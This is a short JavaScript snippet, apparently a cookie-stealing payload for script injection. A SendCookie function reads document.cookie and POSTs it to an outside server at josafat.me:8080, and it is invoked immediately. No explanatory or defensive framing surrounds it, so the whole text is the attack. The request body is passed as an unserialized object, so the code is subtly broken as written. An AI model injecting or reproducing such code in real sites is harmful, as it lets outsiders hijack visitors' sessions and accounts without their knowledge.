async function SendCookie() {
  const response = await fetch("http://josafat.me:8080", {
    body: { cookie: document.cookie },
    method: "POST",
  });
}

SendCookie().then(() => {});
